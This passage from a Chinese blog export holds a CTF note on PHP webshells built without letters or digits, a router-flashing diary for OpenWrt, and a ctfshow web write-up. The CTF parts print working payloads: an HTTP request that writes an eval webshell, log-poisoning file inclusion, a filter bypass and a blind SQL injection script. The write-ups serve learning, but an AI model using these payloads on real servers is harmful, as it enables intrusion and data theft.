number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">5</span>b_<span class="token operator">%</span><span class="token number">5</span>d<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>b</span></code></pre>

<p>注意这两个payload利用的话要php版本小于7才能成功利用，</p>
<blockquote>
<p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p>
<p>但php7中，<code>assert</code>不再是函数，变成了一个语言结构（类似<code>eval</code>），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用<code>file_put_contents</code>函数，同样可以用来<code>getshell</code>。</p>
</blockquote>
<p>测试结果如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/image-20200809170716430.png" alt loading="lazy"></p>
<h3 id="短标签"><a href="#短标签" class="headerlink" title="短标签"></a>短标签</h3><p>PHP中有两种短标签，<code>&lt;??&gt;</code>和<code>&lt;?=?&gt;</code>。其中，<code>&lt;??&gt;</code>相当于对<code>&lt;?php&gt;</code>的替换。而<code>&lt;?=?&gt;</code>则是相当于<code>&lt;? echo&gt;</code>.</p>
<p>例如：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token string single-quoted-string">'whoami'</span><span class="token delimiter important">?></span></span>  //输出  whoami
<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token string backtick-quoted-string">`whoami`</span><span class="token delimiter important">?></span></span>  //输出  命令执行后的结果</code></pre>

<p>PHP中POST上传文件会把我们上传的文件暂时存在<code>/tmp</code>文件夹中，默认文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</p>
<p>尝试生成执行的文件，payload：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">.</span> <span class="token operator">/</span><span class="token operator">??</span><span class="token operator">?</span><span class="token operator">/</span><span class="token operator">??</span><span class="token operator">??</span><span class="token operator">??</span><span class="token operator">??</span><span class="token punctuation">[</span>@<span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span></code></pre>

<p>最后的<code>[@-[]</code>表示ASCII在<code>@</code>和<code>[</code>之间的字符，也就是大写字母，所以最后会执行的文件是<code>tmp</code>文件夹下结尾是大写字母的文件。</p>
<p>exp数据包</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/?exp=?>&lt;?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?></span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">xxxxxx:2333</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span><span class="token header-value">multipart/form-data;boundary=--------123</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">106</span></span>

----------123
<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span><span class="token header-value">form-data;name="file";filename="1.txt"</span></span>

echo "&lt;?php eval(\$_POST['shell']);" > success.php
----------123--</code></pre>

<p>即可<code>getshell</code></p>
<p>拿<code>flag</code>的话还可以使用通配符</p>
<pre class="language-php" data-language="php"><code class="language-php">code=?><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token string backtick-quoted-string">`/???/??? /????`</span><span class="token delimiter important">?></span></span></code></pre>

<p>其中<code>/???/??? /????</code>匹配<code>/bin/cat /flag</code>，这样也能得到<code>flag</code></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></li>
<li><a href="https://xz.aliyun.com/t/7181">通过一道代码审计题目来练习无数字字母构造webshell</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></li>
<li><a href="https://xz.aliyun.com/t/8107">无字母数字webshell总结</a></li>
</ul>
]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>CTF题</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>路由器折腾小记</title>
    <url>/posts/4704f692/</url>
    <content><![CDATA[<p>本文记录我（纯小白）这几天折腾路由器的大致过程，备忘用</p>
<span id="more"></span>

<h4 id="物色路由器"><a href="#物色路由器" class="headerlink" title="物色路由器"></a>物色路由器</h4><p>因为从来没玩过，而且家里好几年前的路由器是时候改换了，于是就准备换台，当初只是单纯的想换台路由器提升提升家里的WiFi信号的网速，都已经在jd上选好了一台水星的，但因为一直在学校迟迟没有买，后来发现了路由器的各种玩法，刷固件fq，解锁某云灰色music之类的，就开始在网上各种资料和固件，也慢慢的在物色一款路由器（原来选中的水星的那个网上资料少，官方好像不支持固件切换），一直在小米和newifi3之间徘徊，最后选择了联想的newifi3，结果无线翻车了，现在后悔了当时为什么没有看到k2p，┭┮﹏┭┮，无线信号是真的差，刷了openwrt后居然赶不上我家原来的老路由器，心态炸了。。。</p>
<p>但是。。。炸归炸，用还是有用的，虽然无线不咋地，当其他方面用用可以的，支持usb，512M的内存</p>
<h4 id="刷不死breed"><a href="#刷不死breed" class="headerlink" title="刷不死breed"></a>刷不死breed</h4><p>先下好不死breed固件，这个网上很多</p>
<p>然后本地搭一个web服务器，把文件放上面，然后在路由器终端了里就可以用wget下载了</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> root@192.168.99.1
<span class="token builtin class-name">cd</span> /tmp
<span class="token function">wget</span> http://xxx.xxx.xxx.xxx/newifi-d2-jail-break.ko
insmod newifi-d2-jail-break.ko</code></pre>

<p>随后SSH 会停止响应，因为 newifi-d2-jail-break.ko 会冻结系统的其他功能，强制写入 Newifi D2 专用版 Breed 到 Flash</p>
<p>然后把路由器电源拔了之后按住reset按钮再插上电源直到只有电源等开始闪烁再松开电源，浏览器输入192.168.1.1即可进入breed web管理界面，再在这里面将原来的eeprom和编程器备份一下，再刷入自己想要的第三方固件（bin文件）</p>
<p>刷这个breed的原因是因为我们在刷第三方固件的时候如果没操作好，固件切换出了差错的话，路由器就变砖了，为了避免这种情况，就有大神做出了这个breed，相当于一个uboot引导加载程序</p>
<h4 id="刷第三方固件"><a href="#刷第三方固件" class="headerlink" title="刷第三方固件"></a>刷第三方固件</h4><p>这里我试了好几个，最后选择了esir大神的openwrt固件，这里可以下载： <a href="https://openwrt.club/dl">https://openwrt.club/dl</a> </p>
<p>选择里面的<code>openwrt-ramips-mt7621-d-team_newifi-d2-squashfs-sysupgrade.bin</code>文件刷入后等待路由器重启，重启完成后输入192.168.1.1即可进入openwrt管理界面</p>
<h4 id="刷openclash"><a href="#刷openclash" class="headerlink" title="刷openclash"></a>刷openclash</h4><p>下载地址 <a href="https://github.com/vernesong/OpenClash/releases">https://github.com/vernesong/OpenClash/releases</a></p>
<p>下好ipk文件，ssh连上路由器，执行以下命令</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /tmp 
opkg update
opkg <span class="token function">install</span> coreutils-nohup <span class="token function">bash</span> iptables dnsmasq-full <span class="token function">curl</span> jsonfilter ca-certificates ipset ip-full iptables-mod-tproxy
<span class="token function">wget</span> https://github.com/vernesong/OpenClash/releases/download/v0.39.6-beta/luci-app-openclash_0.39.6-beta_all.ipk
opkg <span class="token function">install</span> luci-app-openclash_0.39.6-beta_all.ipk</code></pre>

<p>然后刷新一下页面就可以在服务里面看到openclash了，剩下的配置工作就要自己操作了</p>
<p>另外这个版本的自带解锁网易云灰色音乐的功能，直接开启就可以了</p>
<h4 id="自己编译openwrt"><a href="#自己编译openwrt" class="headerlink" title="自己编译openwrt"></a>自己编译openwrt</h4><p>注意：</p>
<ol>
<li><strong>不</strong>要用 <strong>root</strong> 用户来 git 和编译！！！</li>
<li>国内用户编译前最好准备好梯子</li>
<li>默认登陆IP 192.168.1.1, 密码 password</li>
</ol>
<p>需要Ubuntu 18 LTS x64环境</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> update
<span class="token function">sudo</span> <span class="token function">apt-get</span> -y <span class="token function">install</span> build-essential asciidoc binutils <span class="token function">bzip2</span> <span class="token function">gawk</span> gettext <span class="token function">git</span> libncurses5-dev libz-dev patch python3.5 python2.7 <span class="token function">unzip</span> zlib1g-dev lib32gcc1 libc6-dev-i386 subversion flex uglifyjs git-core gcc-multilib p7zip p7zip-full msmtp libssl-dev texinfo libglib2.0-dev xmlto qemu-utils upx libelf-dev autoconf automake libtool autopoint device-tree-compiler g++-multilib antlr3 gperf</code></pre>

<p>然后下载openwrt的源代码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/Lienol/openwrt
<span class="token builtin class-name">cd</span> openwrt/package
<span class="token function">git</span> clone https://github.com/kenzok8/openwrt-packages.git
<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>
./scripts/feeds clean
./scripts/feeds update -a
./scripts/feeds <span class="token function">install</span> -a
<span class="token function">make</span> menuconfig</code></pre>

<p>然后就是配置编译选项了</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">如果是newifi3则：
Target System选择 <span class="token string">"MediaTek Ralink MIPS"</span>
Subtarget选择<span class="token string">"MT7621"</span>
Target Profile选择<span class="token string">"Newifi D2"</span></code></pre>

<p>我们希望有web界面，还需在<code>LuCI ---&gt; Collections</code>选项中选上<code>luci</code></p>
<p>在<code>LuCI ---&gt; Applications</code>选择要添加的插件应用。</p>
<p>在<code>LuCI ---&gt; Themes</code>中设置要安装的主题。</p>
<p><code>make -j8 download v=s</code> 下载dl库</p>
<p>输入 <code>make -j1 V=s</code> （<code>-j</code> 后面的数字1是线程数。第一次编译推荐用单线程）即可开始编译你要的固件了。</p>
<p>编译完成后输出路径：<code>openwrt/bin/targets</code></p>
<p>第二次编译：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> lede
<span class="token function">git</span> pull
./scripts/feeds update -a <span class="token operator">&amp;&amp;</span> ./scripts/feeds <span class="token function">install</span> -a
<span class="token function">make</span> defconfig
<span class="token function">make</span> -j8 download
<span class="token function">make</span> -j<span class="token variable"><span class="token variable">$((</span>$<span class="token punctuation">(</span>nproc<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token variable">))</span></span> <span class="token assign-left variable">V</span><span class="token operator">=</span>s</code></pre>

<p>如果需要重新配置：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> -rf ./tmp <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> -rf .config
<span class="token function">make</span> menuconfig
<span class="token function">make</span> -j<span class="token variable"><span class="token variable">$((</span>$<span class="token punctuation">(</span>nproc<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token variable">))</span></span> <span class="token assign-left variable">V</span><span class="token operator">=</span>s</code></pre>

<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul>
<li><a href="https://cloud.tencent.com/developer/article/1614849">编译自己的openwrt固件 附编译好的newifi3固件</a></li>
<li><a href="https://mianao.info/2020/03/01/轻松编译Openwrt固件支持V2ray和Trojan-上篇">轻松编译Openwrt固件支持V2ray和Trojan-上篇</a></li>
<li><a href="https://mianao.info/2020/03/02/%E8%BD%BB%E6%9D%BE%E7%BC%96%E8%AF%91Openwrt%E5%9B%BA%E4%BB%B6%E6%94%AF%E6%8C%81V2ray%E5%92%8CTrojan-%E4%B8%8B%E7%AF%87">轻松编译Openwrt固件支持V2ray和Trojan-下篇</a></li>
<li><a href="https://mianao.info/2020/05/05/%E7%BC%96%E8%AF%91%E6%9B%B4%E6%96%B0OpenWrt-PassWall%E5%92%8CSSR-plus%E6%8F%92%E4%BB%B6">编译更新OpenWrt PassWall和SSR-plus插件</a></li>
<li><a href="https://github.com/kenzok8/openwrt-packages">openwrt-packages</a></li>
<li><a href="https://github.com/Lienol/openwrt">openwrt</a></li>
<li><a href="https://github.com/coolsnowwolf/lede">lede</a></li>
</ul>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>折腾</tag>
        <tag>路由器</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFSHOW-WEB_AK赛</title>
    <url>/posts/f7521cf/</url>
    <content><![CDATA[<p>在菜鸡的道路上越走越远。。。淦！</p>
<span id="more"></span>

<h3 id="签到-观己"><a href="#签到-观己" class="headerlink" title="签到_观己"></a>签到_观己</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/php/i'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span></code></pre>

<p><code>?file=/flag.txt</code>直接出答案。。这算个非预期解吧</p>
<p>另外的解法：文件包含Nginx日志文件、</p>
<p><code>?file=/var/log/nginx/access.log</code>可读日志文件内容，里面包含用户访问的UA信息</p>
<p>于是</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CTFSHOW-WEB_AK%E8%B5%9B/image-20200803211650015.png" alt loading="lazy"></p>
<p>尝试命令执行</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CTFSHOW-WEB_AK赛/image-20200803211626102.png" alt="image-20200803211626102" loading="lazy">



<p>随后<code>cat /flag.txt</code>即可</p>
<h3 id="Web1-观字"><a href="#Web1-观字" class="headerlink" title="Web1_观字"></a>Web1_观字</h3><p>题目给出源码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">#flag in http://192.168.7.68/flag</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$protocol</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$protocol</span><span class="token operator">!=</span><span class="token string single-quoted-string">'http://'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'仅限http协议访问'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\.|\;|\||\&lt;|\>|\*|\%|\^|\(|\)|\#|\@|\!|\`|\~|\+|\'|\"|\.|\,|\?|\[|\]|\&#123;|\&#125;|\!|\&amp;|\$|0/'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'仅限域名地址访问'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'curl '</span><span class="token operator">.</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p><code>payload</code>：<code>/?url=http://192。168。7。68/flag</code></p>
<p>原因是curl中可以用<code>。</code>替换<code>.</code></p>
<p>另外，ip可以使用十进制进行访问，即<code>http://3232237380/flag</code>，但题目过滤了0</p>
<h3 id="Web2-观星"><a href="#Web2-观星" class="headerlink" title="Web2_观星"></a>Web2_观星</h3><p>url可以给id传值，当传入一个引号的时候回显<code>enheng?</code>，推测sql注入</p>
<p>FUZZ测试发现过滤了以下的内容（长度为533的）</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CTFSHOW-WEB_AK%E8%B5%9B/image-20200801213125358.png" alt loading="lazy"></p>
<p>未过滤<code>^</code>，考虑布尔盲注</p>
<p>payload：</p>
<p><code>id=1^case(ord(substr((database())from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end.format(i,j)</code></p>
<p>过滤了逗号，<code>if</code>无法使用则用<code>case...when...then...else...end</code>代替绕过，<code>substr</code>中的逗号用<code>substr(...from...for...)</code>代替绕过</p>
<p>接下来就可以写脚本了</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">'http://dc894a39-ba77-4e9f-9201-e52d7a19ba5c.chall.ctf.show/index.php?id=1^'</span>
<span class="token comment"># payload = 'case(ord(substr((database())from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end'   web1</span>
<span class="token comment"># payload = 'case(ord(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)regexp(database())))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end'    flag,page,user</span>
<span class="token comment"># payload = 'case(ord(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)regexp(0x666C6167)))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end'    FLAG_COLUMN,flag</span>
payload <span class="token operator">=</span> <span class="token string">'case(ord(substr((select(flag)from(flag))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end'</span>
flag <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        urls <span class="token operator">=</span> url<span class="token operator">+</span>payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>
        request <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>urls<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'I asked nothing'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span></code></pre>

<h3 id="Web3-观图"><a href="#Web3-观图" class="headerlink" title="Web3_观图"></a>Web3_观图</h3><p>showImage.php可看到源码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">//$key = substr(md5('ctfshow'.rand()),3,8);</span>
<span class="token comment">//flag in config.php</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$image</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">openssl_decrypt</span><span class="token punctuation">(</span><span class="token variable">$image</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bf-ecb'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'content-type:image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>图片链接为<code>/showImage.php?image=Z6Ilu83MIDw=</code></p>
<p>可以看到图片文件名是<code>Z6Ilu83MIDw=</code>经过<code>bf-ecb</code>算法用<code>$key</code>得到的，再看<code>$key</code>的生成方式</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>查询<code>rand()</code>函数，若里面的参数为空，则返回<code>0</code>到<code>getrandmax()</code>之间的伪随机整数</p>
<p><code>getrandmax()</code>函数返回随机数可能返回的最大值，既然有上限即可进行爆破来得出<code>key</code>值</p>
<p>脚本如下：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">getrandmax</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token operator">.</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//5a78dbb4</span>
        <span class="token variable">$image</span><span class="token operator">=</span><span class="token string double-quoted-string">"Z6Ilu83MIDw="</span><span class="token punctuation">;</span>
        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">openssl_decrypt</span><span class="token punctuation">(</span><span class="token variable">$image</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bf-ecb'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
